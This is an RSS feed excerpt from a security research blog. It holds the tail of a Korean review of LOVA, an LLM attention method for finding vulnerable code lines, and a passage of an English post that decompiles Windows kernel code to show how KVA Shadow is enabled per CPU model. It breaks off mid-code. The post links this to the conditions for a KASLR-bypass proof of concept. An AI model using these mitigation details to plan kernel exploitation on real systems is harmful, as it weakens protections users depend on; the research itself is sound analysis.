&#xBCA4;&#xCE58;&#xB9C8;&#xD06C;&#xB97C; &#xB300;&#xC0C1;&#xC73C;&#xB85C; &#xD588;&#xC73C;&#xBA70; Llama-3.1-8B-Instruct, Mistral-7B-Instruct-v0.2, Phi3.5-mini-instruct &#xAC19;&#xC774; 10B &#xC774;&#xD558;&#xC758; &#xBAA8;&#xB378;&#xB4E4;&#xC744; &#xD65C;&#xC6A9;&#xD588;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p><ul><li>LOVA&#xB294; &#xAE30;&#xC874; LLM&#xC758; &#xC9C1;&#xC811; &#xCD9C;&#xB825; &#xBC29;&#xC2DD;&#xC5D0; &#xBE44;&#xD574; &#xB6F0;&#xC5B4;&#xB09C; &#xCDE8;&#xC57D;&#xC810; &#xC704;&#xCE58; &#xD2B9;&#xC815; &#xB2A5;&#xB825;&#xC744; &#xBCF4;&#xC5EC;&#xC8FC;&#xBA70;, &#xD2B9;&#xD788; &#xAE34; &#xCF54;&#xB4DC; &#xB9E5;&#xB77D;&#xC5D0;&#xC11C; F1-score &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xCD5C;&#xB300; 5&#xBC30;&#xC758; &#xC131;&#xB2A5; &#xD5A5;&#xC0C1;&#xC744; &#xB2EC;&#xC131;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>LOVA&#xB294; &#xB2E4;&#xC591;&#xD55C; &#xD504;&#xB85C;&#xADF8;&#xB798;&#xBC0D; &#xC5B8;&#xC5B4;&#xC5D0;&#xC11C; &#xB6F0;&#xC5B4;&#xB09C; &#xCDE8;&#xC57D;&#xC810; &#xC704;&#xCE58; &#xD2B9;&#xC815; &#xACB0;&#xACFC;&#xB97C; &#xB2EC;&#xC131;&#xD558;&#xBA70;, &#xCD5C;&#xB300; 14.6&#xBC30;&#xC758; &#xD5A5;&#xC0C1;&#xC744; &#xBCF4;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>LOVA&#xB294; &#xB2E4;&#xC591;&#xD55C; LLM &#xC544;&#xD0A4;&#xD14D;&#xCC98;&#xC5D0; &#xC801;&#xC6A9; &#xAC00;&#xB2A5;&#xD558;&#xBA70; &#xC77C;&#xAD00;&#xB41C; &#xACB0;&#xACFC;&#xB97C; &#xBCF4;&#xC5EC;&#xC90D;&#xB2C8;&#xB2E4;.</li></ul><p>&#xC804;&#xCCB4;&#xC801;&#xC73C;&#xB85C; &#xC778;&#xC0C1;&#xC801;&#xC778; &#xC131;&#xB2A5;&#xC744; &#xBCF4;&#xC5EC;&#xC90D;&#xB2C8;&#xB2E4;. &#xBAA8;&#xB450; &#xAC19;&#xC740; &#xBAA8;&#xB378;&#xC744; &#xD65C;&#xC6A9;&#xD55C;&#xB2E4;&#xACE0; &#xD588;&#xC744; &#xB54C;, CoT, MoA, rStar &#xB4F1; &#xC5EC;&#xB7EC; &#xAE30;&#xBC95;&#xC744; &#xC0AC;&#xC6A9;&#xD55C; &#xAC83;&#xACFC; &#xBE44;&#xAD50;&#xD55C; &#xAC83;&#xB3C4; &#xC88B;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBB34;&#xC5C7;&#xBCF4;&#xB2E4; self-attention &#xBA54;&#xCEE4;&#xB2C8;&#xC998;&#xC744; &#xCC98;&#xC74C;&#xC73C;&#xB85C; &#xCDE8;&#xC57D;&#xC810; &#xD0D0;&#xC9C0;&#xC5D0; &#xC0AC;&#xC6A9;&#xD588;&#xB2E4;&#xB294; &#xC2DC;&#xB3C4;&#xB9CC;&#xC73C;&#xB85C;&#xB3C4; &#xC758;&#xBBF8;&#xAC00; &#xC788;&#xB2E4;&#xACE0; &#xC0DD;&#xAC01;&#xD569;&#xB2C8;&#xB2E4;.</p><h1 id="5-&#xC544;&#xC26C;&#xC6B4;-&#xC810;"><a href="#5-&#xC544;&#xC26C;&#xC6B4;-&#xC810;" class="headerlink" title="5. &#xC544;&#xC26C;&#xC6B4; &#xC810;"></a>5. &#xC544;&#xC26C;&#xC6B4; &#xC810;</h1><ol><li>&#xB354; &#xD070; &#xBAA8;&#xB378;&#xACFC;&#xC758; &#xBE44;&#xAD50; &#xBD80;&#xC7AC;<ul><li>&#xC774; &#xB17C;&#xBB38;&#xC5D0;&#xC11C;&#xB294; Llama-3.1-8B-Instruct, Mistral-7B-Instruct-v0.2, Phi3.5-mini-instruct&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xD14C;&#xC2A4;&#xD2B8;&#xB97C; &#xD588;&#xC9C0;&#xB9CC; &#xC774;&#xBCF4;&#xB2E4; &#xD070; &#xBAA8;&#xB378;&#xACFC;&#xC758; &#xBE44;&#xAD50;&#xAC00; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>&#xC774; &#xB17C;&#xBB38;&#xC5D0;&#xC11C;&#xC758; &#xBC29;&#xC2DD;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; &#xAC01; &#xCF54;&#xB4DC; &#xB77C;&#xC778;&#xB9C8;&#xB2E4; &#xC5B4;&#xD150;&#xC158; &#xBA54;&#xD2B8;&#xB9AD;&#xC2A4;&#xB97C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC57C; &#xD558;&#xB294;&#xB370;, &#xC774; &#xB54C; &#xAC78;&#xB9AC;&#xB294; &#xC2DC;&#xAC04;&#xC774;&#xB098; &#xC5F0;&#xC0B0;&#xD574;&#xC57C;&#xD560; &#xD589;&#xB82C;&#xC774; &#xB354; &#xB9CE;&#xC544;&#xC838; &#xD070; &#xBAA8;&#xB378;&#xC744; &#xD65C;&#xC6A9;&#xD558;&#xAE30;&#xC5D0;&#xB294; &#xD558;&#xB4DC;&#xC6E8;&#xC5B4;&#xAC00; &#xBD80;&#xC871;&#xD588;&#xB2E4;&#xACE0; &#xC0DD;&#xAC01;&#xD558;&#xAE34; &#xD569;&#xB2C8;&#xB2E4;.</li><li>&#xADF8;&#xB807;&#xB2E4;&#xBA74; &#xB354; &#xD070;&#xBAA8;&#xB378;&#xC758; &#xBC14;&#xB2D0;&#xB77C; &#xC544;&#xC6C3;&#xD48B;&#xACFC;&#xC758; &#xBE44;&#xAD50;&#xC815;&#xB3C4;&#xB294; &#xD574;&#xBD10;&#xB3C4; &#xC88B;&#xC9C0; &#xC54A;&#xC744;&#xAE4C; &#xC2F6;&#xB124;&#xC694;.(&#xC544; &#xC774;&#xAC74; &#xB0B4;&#xAC00; &#xD574;&#xBCF4;&#xBA74; &#xB418;&#xB098;&#x2026;?) &#xB354; &#xD070; &#xBAA8;&#xB378;&#xC758; &#xBC14;&#xB2D0;&#xB77C; &#xC544;&#xC6C3;&#xD48B;&#xACFC; &#xBE44;&#xBE4C;&#xB9CC;&#xD558;&#xB2E4;&#x2026;! &#xC815;&#xB3C4;&#xB85C;&#xB9CC; &#xB098;&#xC640;&#xB3C4; &#xC758;&#xBBF8;&#xC788;&#xC73C;&#xB824;&#xB098;&#x2026;?</li></ul></li><li>&#xC804;&#xB825; &#xD6A8;&#xC728;&#xC131; &#xB610;&#xB294; &#xACC4;&#xC0B0; &#xBE44;&#xC6A9; &#xBE44;&#xAD50; &#xBD80;&#xC7AC;<ul><li>LOVA&#xB294; &#xAC01; &#xCF54;&#xB4DC; &#xB77C;&#xC778;&#xC744; &#xAC1C;&#xBCC4;&#xC801;&#xC73C;&#xB85C; &#xD558;&#xC774;&#xB77C;&#xC774;&#xD2B8;&#xD558;&#xC5EC; &#xC5EC;&#xB7EC; &#xBC84;&#xC804;&#xC758; &#xD504;&#xB86C;&#xD504;&#xD2B8;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xACE0;, &#xC774;&#xB4E4; &#xAC04;&#xC758; &#xC5B4;&#xD150;&#xC158; &#xB9F5; &#xCC28;&#xC774;&#xB97C; &#xACC4;&#xC0B0;&#xD558;&#xB294; &#xB4F1; &#xC5EC;&#xB7EC; &#xB2E8;&#xACC4;&#xB97C; &#xAC70;&#xCE69;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; &#xCC28;&#xC6D0; &#xCD95;&#xC18C; &#xBC0F; Bi-LSTM &#xBD84;&#xB958;&#xAE30; &#xC0AC;&#xC6A9;&#xC740; &#xBCF5;&#xC7A1;&#xB3C4;&#xB97C; &#xB354;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li>&#xC774; &#xB17C;&#xBB38;&#xC740; &#xC2E4;&#xC81C; &#xB300;&#xADDC;&#xBAA8; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xD504;&#xB85C;&#xC81D;&#xD2B8;&#xC5D0; &#xC801;&#xC6A9;&#xB420; &#xB54C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xC2DC;&#xAC04;&#xC801;, &#xC7AC;&#xC815;&#xC801; &#xBE44;&#xC6A9;&#xC5D0; &#xB300;&#xD55C; &#xC5B8;&#xAE09;&#xC774; &#xBD80;&#xC871;&#xD569;&#xB2C8;&#xB2E4;. &#xB370;&#xC774;&#xD130;&#xC14B; &#xBE44;&#xAD50;&#xB294; &#xC131;&#xB2A5; &#xBE44;&#xAD50; &#xCC28;&#xC6D0;&#xC5D0;&#xC11C; &#xD65C;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC740; &#xC88B;&#xC9C0;&#xB9CC; &#xCF54;&#xB4DC;&#xC591;&#xC774; &#xB298;&#xC5B4;&#xB0AC;&#xC744; &#xB54C; &#xC5BC;&#xB9C8;&#xB098; &#xB354; &#xB9CE;&#xC740; &#xACC4;&#xC0B0;&#xC744; &#xD574;&#xC57C;&#xD558;&#xB294;&#xC9C0; &#xCE21;&#xC815;&#xD558;&#xB294; &#xB0B4;&#xC6A9;&#xC774; &#xC788;&#xC5C8;&#xC73C;&#xBA74; &#xC88B;&#xC744;&#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.(&#xB17C;&#xBB38;&#xC740; LLM&#xC758; &#xC785;&#xB825; &#xC81C;&#xC57D;&#xC0AC;&#xD56D;&#xC744; &#xC900;&#xC218;&#xD558;&#xAE30; &#xC704;&#xD574; 4,000 &#xD1A0;&#xD070;&#xC744; &#xCD08;&#xACFC;&#xD558;&#xB294; &#xCEE8;&#xD14D;&#xC2A4;&#xD2B8;&#xB97C; &#xD544;&#xD130;&#xB9C1;&#xD588;&#xB2E4;&#xACE0; &#xC5B8;&#xAE09;&#xD569;&#xB2C8;&#xB2E4;.)</li></ul></li></ol><p>&#xD6C4;&#x2026; &#xC774;&#xBC88; &#xD3EC;&#xC2A4;&#xD305;&#xC740; &#xC774;&#xC815;&#xB3C4;&#xB85C; &#xB9C8;&#xBB34;&#xB9AC;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC9C1;&#xC811; &#xAC1C;&#xBC1C;&#xD574;&#xC11C; 2&#xD3B8;&#xC73C;&#xB85C; &#xB9CC;&#xB4E4;&#xAE4C;&#x2026;?&#xB77C;&#xB294; &#xC0DD;&#xAC01;&#xC744; &#xD574;&#xBCF4;&#xC558;&#xC9C0;&#xB9CC;&#x2026; &#xC81C; &#xD604;&#xC0DD;&#xC774; &#xC800;&#xD55C;&#xD14C; &#xD5C8;&#xB77D;&#xD574;&#xC8FC;&#xC9C0; &#xC54A;&#xC744;&#xAC70; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xD558; &#xADF8;&#xB807;&#xB2E4;&#xBA74; &#xB2E4;&#xC74C; &#xD3B8;&#xC73C;&#xB85C; &#xB3CC;&#xC544;&#xC624;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;! (&#xC774;&#xC81C;&#xB294; &#xC9C4;&#xC9DC; Usenix &#xBD10;&#xC57C;&#xC9C0;&#x2026;)</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/LLM/">LLM</category>
      
      <category domain="https://hackyboiz.github.io/tags/LLM-Security/">LLM Security</category>
      
      <category domain="https://hackyboiz.github.io/tags/LLM-Safety/">LLM Safety</category>
      
      <category domain="https://hackyboiz.github.io/tags/Transformer/">Transformer</category>
      
      <category domain="https://hackyboiz.github.io/tags/Attention/">Attention</category>
      
      <category domain="https://hackyboiz.github.io/tags/Automated-vulnerability-Detection/">Automated vulnerability Detection</category>
      
      
      <comments>https://hackyboiz.github.io/2025/08/11/j0ker/llm_part3/kr/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Deep Dive into KVA Shadow&#39;s Dynamic Activation Mechanism(En)</title>
      <link>https://hackyboiz.github.io/2025/08/10/l0ch/deep-dive-into-kva/en/</link>
      <guid>https://hackyboiz.github.io/2025/08/10/l0ch/deep-dive-into-kva/en/</guid>
      <pubDate>Sun, 10 Aug 2025 12:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;Hello, this is L0ch!  It&amp;#x2019;s been a while since my last post.&lt;/p&gt;
&lt;p&gt;Last week&amp;#x2019;s topic was &lt;a href=&quot;https://hackyboiz.github.</description>
        
      
      
      
      <content:encoded><![CDATA[<p>Hello, this is L0ch!  It&#x2019;s been a while since my last post.</p><p>Last week&#x2019;s topic was <a href="https://hackyboiz.github.io/2025/04/13/l0ch/bypassing-kernel-mitigation-part0/ko/">[Research] Bypassing Windows Kernel Mitigations: Part 0 - Deep Dive into KASLR Leaks Restriction</a>. I mentioned that one of the conditions for the KASLR bypass PoC to work is that KVA Shadow is disabled!</p><p>At the time of writing, I had assumed that KVAS was disabled by default in the latest Windows 11, but through feedback, I learned that KVAS is dynamically activated based on CPU model and specific vulnerabilities, rather than Windows version.</p><h1 id="SpeculationControl-PowerShell-script"><a href="#SpeculationControl-PowerShell-script" class="headerlink" title="SpeculationControl PowerShell script"></a><strong>SpeculationControl PowerShell script</strong></h1><p>KVAS is closely related to various speculative execution-based side-channel vulnerabilities, such as Meltdown and Spectre, so you can easily check the relevant MS support information.</p><p><a href="https://support.microsoft.com/en-us/topic/kb4074629-understanding-speculationcontrol-powershell-script-output-fd70a80a-a63f-e539-cda5-5be4c9e67c04">https://support.microsoft.com/en-us/topic/kb4074629-understanding-speculationcontrol-powershell-script-output-fd70a80a-a63f-e539-cda5-5be4c9e67c04</a></p><p>The results of testing on my computer with a 12th generation Intel CPU are summarized as follows.</p><pre><code class="hljs powershell"><span class="hljs-comment"># Windwos 11 24H2 - Intel 12th i7-12700</span><span class="hljs-built_in">PS</span> C:\WINDOWS\system32&gt; <span class="hljs-built_in">Install-Module</span> <span class="hljs-literal">-Name</span> SpeculationControl                                                                                                                                                                                 need a NuGet provider to <span class="hljs-keyword">continue</span>.<span class="hljs-built_in">PS</span> C:\WINDOWS\system32&gt; <span class="hljs-built_in">Get-SpeculationControlSettings</span>BTIHardwarePresent                  : TrueBTIWindowsSupportPresent            : TrueBTIWindowsSupportEnabled            : TrueBTIDisabledBySystemPolicy           : FalseBTIDisabledByNoHardwareSupport      : FalseBTIKernelRetpolineEnabled           : FalseBTIKernelImportOptimizationEnabled  : TrueRdclHardwareProtectedReported       : TrueRdclHardwareProtected               : TrueKVAShadowRequired                   : FalseKVAShadowWindowsSupportPresent      : TrueKVAShadowWindowsSupportEnabled      : FalseKVAShadowPcidEnabled                : FalseSSBDWindowsSupportPresent           : TrueSSBDHardwareVulnerable              : TrueSSBDHardwarePresent                 : TrueSSBDWindowsSupportEnabledSystemWide : FalseL1TFHardwareVulnerable              : FalseL1TFWindowsSupportPresent           : TrueL1TFWindowsSupportEnabled           : FalseL1TFInvalidPteBit                   : <span class="hljs-number">0</span>L1DFlushSupported                   : TrueHvL1tfStatusAvailable               : TrueHvL1tfProcessorNotAffected          : TrueMDSWindowsSupportPresent            : TrueMDSHardwareVulnerable               : FalseMDSWindowsSupportEnabled            : FalseFBClearWindowsSupportPresent        : TrueSBDRSSDPHardwareVulnerable          : FalseFBSDPHardwareVulnerable             : FalsePSDPHardwareVulnerable              : FalseFBClearWindowsSupportEnabled        : False</code></pre><div class="table-container"><table><thead><tr><th>Hardware requires kernel VA shadowing</th><th>Maps to KVAShadowRequired. This line tells you whether your system requires kernel VA shadowing to mitigate a vulnerability.</th></tr></thead><tbody><tr><td>Windows OS support for rogue data cache load mitigation is present</td><td>Maps to KVAShadowWindowsSupportPresent. This line tells you whether Windows operating system support for the kernel VA shadow feature is present.</td></tr><tr><td>Windows OS support for kernel VA shadow is present</td><td>Maps to KVAShadowWindowsSupportPresent. This line tells you whether Windows operating system support for the kernel VA shadow feature is present. If it is True, the January 2018 update is installed on the device, and kernel VA shadow is supported. If it is False, the January 2018 update is not installed, and kernel VA shadow support does not exist.</td></tr><tr><td>Windows OS support for rogue data cache load mitigation is enabled</td><td>Maps to KVAShadowWindowsSupportEnabled. This line tells you whether the kernel VA shadow feature is enabled. If it is True, the hardware is believed to be vulnerable to CVE-2017-5754, Windows operating system support is present, and the feature is enabled.</td></tr><tr><td>Windows OS support for kernel VA shadow is enabled</td><td>Maps to KVAShadowWindowsSupportEnabled. This line tells you whether the kernel VA shadow feature is enabled. If it is True, Windows operating system support is present, and the feature is enabled. The Kernel VA shadow feature is currently enabled by default on client versions of Windows and is disabled by default on versions of Windows Server. If it is False, either Windows operating system support is not present, or the feature is not enabled.</td></tr></tbody></table></div><pre><code class="hljs cpp">Although the KVA Shadow feature exists in Windows,(KVAShadowWindowsSupportPresent: True) it is <span class="hljs-keyword">not</span> necessary.(KVAShadowRequired: False) <span class="hljs-function">so <span class="hljs-keyword">not</span> <span class="hljs-title">activated</span><span class="hljs-params">(KVAShadowWindowsSupportEnabled: False)</span></span></code></pre><p>We can see that KVAS is disabled, which means that although the mitigation feature exists, <strong>the hardware (CPU) is not vulnerable, so the mitigation feature is disabled</strong>.</p><p>So where and how does Windows identify vulnerable CPUs and determine whether to enable KVAS?</p><h1 id="Background-Knowledge-CPU-Identification"><a href="#Background-Knowledge-CPU-Identification" class="headerlink" title="Background Knowledge - CPU Identification"></a>Background Knowledge - CPU Identification</h1><p>Windows identifies the CPU vendor on its own. As defined in the <a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/amd64_x/cpu_vendors.htm">CPU_VENDORS</a> Enum, unknown manufacturers are defined as 0, AMD as 1, and Intel as 2.</p><pre><code class="hljs jsx">typedef enum{    CPU_UNKNOWN,   <span class="hljs-comment">// 0</span>    CPU_AMD,       <span class="hljs-comment">// 1</span>    CPU_INTEL,     <span class="hljs-comment">// 2</span>    CPU_VIA        <span class="hljs-comment">// 3</span>} CPU_VENDORS;</code></pre><p>CPU information such as vendor, Faily ID, and Model ID is stored in the <a href="https://www.vergiliusproject.com/kernels/x64/windows-11/24h2/_KPRCB">KPRCB</a> structure. </p><p>These IDs are defined by each CPU vendor. In the case of Intel, the Family ID, Model ID, and generation information for Intel CPU products are defined in the <a href="https://www.intel.com/content/www/us/en/content-details/782158/">Intel Developer Manual</a>. Since it&#x2019;s not feasible to review the entire 5,000-page manual, I used gemini to summarize the information in the table below.</p><div class="table-container"><table><thead><tr><th><strong>MircoArchitecture(gen)</strong></th><th>Processor family</th><th><strong>Family ID (Hex)</strong></th><th><strong>Model ID (Hex)</strong></th></tr></thead><tbody><tr><td>Raptor Lake (13 gen)</td><td>Intel Core</td><td>06H</td><td>B7H, BFH</td></tr><tr><td>Alder Lake (12 gen)</td><td>Intel Core</td><td>06H</td><td>97H, 9AH</td></tr><tr><td>Tiger Lake (11 gen)</td><td>Intel Core</td><td>06H</td><td>8CH, 8DH</td></tr><tr><td>Rocket Lake (11 gen)</td><td>Intel Core</td><td>06H</td><td>A7H</td></tr><tr><td>Ice Lake (10 gen)</td><td>Intel Core</td><td>06H</td><td>7DH, 7EH</td></tr><tr><td>Comet Lake (10 gen)</td><td>Intel Core</td><td>06H</td><td>A5H, A6H</td></tr><tr><td>Amber Lake Y (8 gen)</td><td>Intel Core</td><td>06H</td><td>8EH</td></tr><tr><td>Whiskey Lake U (8 gen)</td><td>Intel Core</td><td>06H</td><td>8EH</td></tr><tr><td>Coffee Lake (8, 9 gen)</td><td>Intel Core</td><td>06H</td><td>9EH</td></tr><tr><td>Kaby Lake (7 gen)</td><td>Intel Core</td><td>06H</td><td>8EH, 9EH</td></tr><tr><td>Skylake (6 gen)</td><td>Intel Core</td><td>06H</td><td>4EH, 5EH, 55H</td></tr><tr><td>Broadwell (5 gen)</td><td>Intel Core</td><td>06H</td><td>3DH, 47H, 4FH</td></tr><tr><td>Haswell (4 gen)</td><td>Intel Core</td><td>06H</td><td>3CH, 45H, 46H, 3FH</td></tr><tr><td>Ivy Bridge (3 gen)</td><td>Intel Core</td><td>06H</td><td>3AH</td></tr><tr><td>Sandy Bridge (2 gen)</td><td>Intel Core</td><td>06H</td><td>2AH</td></tr><tr><td>Westmere (2010)</td><td>Intel Core</td><td>06H</td><td>25H, 2CH, 2FH</td></tr><tr><td>Nehalem (1 gen)</td><td>Intel Core</td><td>06H</td><td>1AH, 1EH, 1FH, 2EH</td></tr><tr><td>Penryn</td><td>Core 2 Duo/Quad</td><td>06H</td><td>17H, 1DH</td></tr><tr><td>Merom</td><td>Core 2 Duo</td><td>06H</td><td>0FH</td></tr><tr><td>Yonah</td><td>Core Duo/Solo</td><td>06H</td><td>0EH</td></tr></tbody></table></div><p>I also organized and analyzed the ID lists of AMD and other vendors.</p><h1 id="Analysis-of-KVAS-Activation-Logic"><a href="#Analysis-of-KVAS-Activation-Logic" class="headerlink" title="Analysis of KVAS Activation Logic"></a>Analysis of KVAS Activation Logic</h1><p>Analysis Environment: Windows 24H2 64-bit 10.0.26100.1742</p><p>Returning to the topic at hand, in order to analyze the mitigation initialization logic, we need to examine the part of the Windows boot process that initializes the kernel. </p><p>The entry point of the Windows kernel image <code>ntoskrnl.exe</code> is <code>KiSystemStartup</code>, which performs various tasks such as CPU initialization, mitigation-related feature settings, and kernel debugger initialization.</p><p>The function that determines whether KVAS is enabled was surprisingly easy to find.</p><ul><li>KiSystemStartup &#x2192; KiInitializeBootStructures &#x2192; KiSetFeatureBits &#x2192; KiDetectKvaLeakage</li></ul><pre><code class="hljs cpp"><span class="hljs-function">NTSTATUS __stdcall __noreturn <span class="hljs-title">KiSystemStartup</span><span class="hljs-params">(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)</span></span><span class="hljs-function"></span>{<span class="hljs-comment">//...</span>  KeLoaderBlock_0 = (__int64)DriverObject;  <span class="hljs-keyword">if</span> ( !*((_DWORD *)DriverObject-&gt;MajorFunction[<span class="hljs-number">3</span>] + <span class="hljs-number">9</span>) )    KasanInitSystem(DriverObject, <span class="hljs-number">0</span>i64);  <span class="hljs-keyword">if</span> ( !*(_DWORD *)(*(_QWORD *)(KeLoaderBlock_0 + <span class="hljs-number">136</span>) + <span class="hljs-number">36</span>i64) )    KdInitSystem(<span class="hljs-number">0xFFFFFFFF</span>i64, KeLoaderBlock_0);  v2 = *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> **)(KeLoaderBlock_0 + <span class="hljs-number">136</span>);<span class="hljs-comment">//...</span>  KiInitializeBootStructures(KeLoaderBlock_0);  <span class="hljs-comment">// Initialize Boot Structures</span>  <span class="hljs-keyword">if</span> ( !*MK_FP(<span class="hljs-number">43</span>, *MK_FP(<span class="hljs-number">43</span>, KeLoaderBlock_0 + <span class="hljs-number">136</span>) + <span class="hljs-number">36</span>i64) )    KdInitSystem(<span class="hljs-number">0</span>i64, KeLoaderBlock_0);<span class="hljs-comment">//...</span>}<span class="hljs-function">__int64 __fastcall <span class="hljs-title">KiInitializeBootStructures</span><span class="hljs-params">(__int64 a1)</span></span><span class="hljs-function"></span>{  KPCR *Pcr; <span class="hljs-comment">// r14</span>  _KPROCESS **v2; <span class="hljs-comment">// rbx</span>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">KPRCB</span> *<span class="hljs-title">CurrentPrcb</span>;</span> <span class="hljs-comment">// rdi</span><span class="hljs-comment">//...</span>  <span class="hljs-keyword">if</span> ( !KeGetPcr()-&gt;Prcb.Number )    KiInitializeNxSupportDiscard(v19, v18, v20);  HalInitializeProcessor(Number, a1, v20);  KiSetFeatureBits(CurrentPrcb);                <span class="hljs-comment">// Set Prcb Feature Bits</span>  CurrentPCB_Number = CurrentPrcb-&gt;Number;  v27 = KiSystemCall32;  v28 = KiSystemCall64;  <span class="hljs-keyword">if</span> ( !CurrentPCB_Number )  {    KiEnableKvaShadowing(CurrentPrcb);              <span class="hljs-comment">//  Decide whether to enable KVA Shadow</span>    CurrentPCB_Number = CurrentPrcb-&gt;Number;  }  <span class="hljs-keyword">if</span> ( KiKvaShadow )                             <span class="hljs-comment">// When the KVA Shadow flag is enabled</span>  {    v27 = KiSystemCall32Shadow;                 <span class="hljs-comment">// instead of KiSystemCall32/KiSystemCall64  </span>    v28 = KiSystemCall64Shadow;                 <span class="hljs-comment">// use KiSystemCall32Shadow/KiSystemCall64Shadow</span>  }  <span class="hljs-comment">//...</span>}<span class="hljs-function">__int64 __fastcall <span class="hljs-title">KiSetFeatureBits</span><span class="hljs-params">(_KPRCB *CurrentPRCB)</span></span><span class="hljs-function"></span>{  <span class="hljs-keyword">char</span> CpuType; <span class="hljs-comment">// bl</span>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> CpuModel; <span class="hljs-comment">// ecx</span>  <span class="hljs-keyword">unsigned</span> __int8 CpuVendor; <span class="hljs-comment">// dl</span>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> ProcessorSignature; <span class="hljs-comment">// eax</span>  <span class="hljs-keyword">unsigned</span> __int8 CpuStepping; <span class="hljs-comment">// cl</span>  <span class="hljs-keyword">unsigned</span> __int8 v57; <span class="hljs-comment">// al</span>  <span class="hljs-keyword">unsigned</span> __int64 v58; <span class="hljs-comment">// rcx</span><span class="hljs-comment">//...</span>  CpuType = CurrentPRCB-&gt;CpuType_Family;        <span class="hljs-comment">// CpuType = Processor Family</span>  CpuModel = CurrentPRCB-&gt;CpuModel;  CpuVendor = CurrentPRCB-&gt;CpuVendor;  v123 = (CpuVendor - <span class="hljs-number">1</span>) &lt;= <span class="hljs-number">1u</span>;  <span class="hljs-keyword">if</span> ( CurrentPRCB-&gt;Number )  {    ProcessorSignature = KiGetProcessorSignature(<span class="hljs-number">0</span>i64, <span class="hljs-number">0</span>i64, <span class="hljs-number">0</span>i64, <span class="hljs-number">0</span>i64);    KiSetProcessorSignature(CurrentPRCB, ProcessorSignature);    <span class="hljs-keyword">goto</span> LABEL_40;  }<span class="hljs-comment">//... </span>  KiDetectKvaLeakage(CurrentPRCB);      <span class="hljs-comment">// Detect - KVA needs to be activated</span>  _m_prefetchw(CurrentPRCB);  <span class="hljs-keyword">if</span> ( CurrentPRCB-&gt;CpuVendor == <span class="hljs-number">1</span> )  {    v52 |= <span class="hljs-number">0x100000</span>u;    HIDWORD(v134) = v52;  }<span class="hljs-comment">//...</span>}</code></pre><h2 id="KVAS-Activation-for-Meltdown"><a href="#KVAS-Activation-for-Meltdown" class="headerlink" title="KVAS Activation for Meltdown"></a>KVAS Activation for Meltdown</h2><p>In the above call chain, the <code>KiDetectKvaLeakage</code> function is the core function that determines whether KVA is enabled.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> __fastcall <span class="hljs-title">KiDetectKvaLeakage</span><span class="hljs-params">(_KPRCB *a1)</span></span><span class="hljs-function"></span>{  __int64 p_CpuVendor; <span class="hljs-comment">// rsi</span>  <span class="hljs-keyword">unsigned</span> __int64 _RAX; <span class="hljs-comment">// rax</span>  __int64 v4; <span class="hljs-comment">// rcx</span>  __int64 _RAX; <span class="hljs-comment">// rax</span>  __int64 _RAX; <span class="hljs-comment">// rax</span>  __int64 _RDX; <span class="hljs-comment">// rdx</span>  <span class="hljs-keyword">unsigned</span> __int64 v13; <span class="hljs-comment">// rdx</span>  <span class="hljs-keyword">bool</span> v14; <span class="hljs-comment">// zf</span>  <span class="hljs-keyword">int</span> *v15; <span class="hljs-comment">// rdx</span>  <span class="hljs-keyword">int</span> v16; <span class="hljs-comment">// ecx</span>  __int64 v17; <span class="hljs-comment">// rbx</span>  __int64 _RAX; <span class="hljs-comment">// rax</span>  __int64 _RAX; <span class="hljs-comment">// rax</span>  __int64 _RAX; <span class="hljs-comment">// rax</span>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> Number; <span class="hljs-comment">// edx</span>  <span class="hljs-keyword">int</span> v29[<span class="hljs-number">6</span>]; <span class="hljs-comment">// [rsp+30h] [rbp-20h] BYREF</span>  v29[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;  p_CpuVendor = &amp;a1-&gt;CpuVendor;    <span class="hljs-comment">// Check 1</span>  LODWORD(_RAX) = KiIsKvaShadowNeededForBranchConfusion(a1);  <span class="hljs-keyword">if</span> ( _RAX )    <span class="hljs-keyword">goto</span> ENABLE_KVAS_BRANCH_CONFUSION;  LODWORD(_RAX) = *p_CpuVendor;    <span class="hljs-comment">// Check 2</span>  <span class="hljs-comment">// Intel - Check with bitmask</span>  <span class="hljs-keyword">if</span> ( *p_CpuVendor == <span class="hljs-number">2</span> )  {    _RAX = a1-&gt;CpuModel;    <span class="hljs-keyword">if</span> ( a1-&gt;CpuType == <span class="hljs-number">6</span> &amp;&amp; _RAX &lt;= <span class="hljs-number">0x36</span>u )    {      v4 = <span class="hljs-number">0x6000C010000000</span>i64;      <span class="hljs-keyword">if</span> ( _bittest64(&amp;v4, _RAX) )        <span 